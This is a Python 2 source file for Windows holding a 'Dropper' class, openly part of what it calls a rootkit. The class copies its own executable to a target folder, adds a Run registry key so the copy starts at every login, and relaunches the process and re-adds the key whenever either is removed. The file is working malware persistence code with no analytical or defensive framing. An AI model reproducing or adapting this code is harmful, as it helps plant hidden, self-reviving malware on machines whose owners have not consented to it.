import os
import sys
import _winreg
import subprocess
from time   import sleep
from shutil import copy
from psutil import process_iter

class Dropper(object):
    def __init__(self, target_path, new_filename):
        # filename and filepath.
        self.dropname         = new_filename
        self.current_filename = sys.executable
        self.current_filepath = os.path.abspath(self.current_filename)
        self.current_dirpath  = os.path.dirname(os.path.abspath(self.current_filename))
        
        self.target_dirpath   = target_path
        self.target_filepath  = self.target_dirpath + self.dropname
        
        # winreg.
        self.key_value        = r'Software\Microsoft\Windows\CurrentVersion\Run'
        self.key_name         = self.dropname.split('.')[0]
        
    def drop(self, drop_path, filename):
        # overwrite the file if the file already exists.
        copy(self.current_filepath, drop_path+filename)
        
    def resurrect_proc(self, proc_name, proc_path):
        if (proc_name in (p.name() for p in process_iter())) is not True:
            print('Resurrecting rootkit...')
            subprocess.call(proc_path + proc_name)
            sleep(5)
        
    def resurrect_key(self, proc_name, proc_path):
        self.add_startup(proc_name.split('.')[0], proc_path+proc_name)
            
    def add_startup(self, keyname, filepath):
        try:
            self.targetkey = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.key_value, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.SetValueEx(self.targetkey, keyname, 0, _winreg.REG_SZ, filepath)
            print("[dmesg] added startup to registry.")
        except Exception:
            print("[dmesg] error occurred while modifying registry.")
            
    def uninstall(self, keyname):
        # remove startup from registry.
        try:
            self.targetkey = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.key_value, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(self.targetkey, keyname.split('.')[0])
            print("[dmesg] Removed startup from registry.")
        except Exception as e:
            print("[dmesg] An error occurred while modifying registry." + str(e))
            
        # delete the main file.
        #os.remove(self.target_filepath)
        # kill process.
        #sys.exit(0)
        
    def start(self):
        # drop the payload to the target_dirpath.
        self.drop(self.target_dirpath, self.dropname)
        # add to startup.
        self.add_startup(self.dropname.split('.')[0], self.target_filepath)
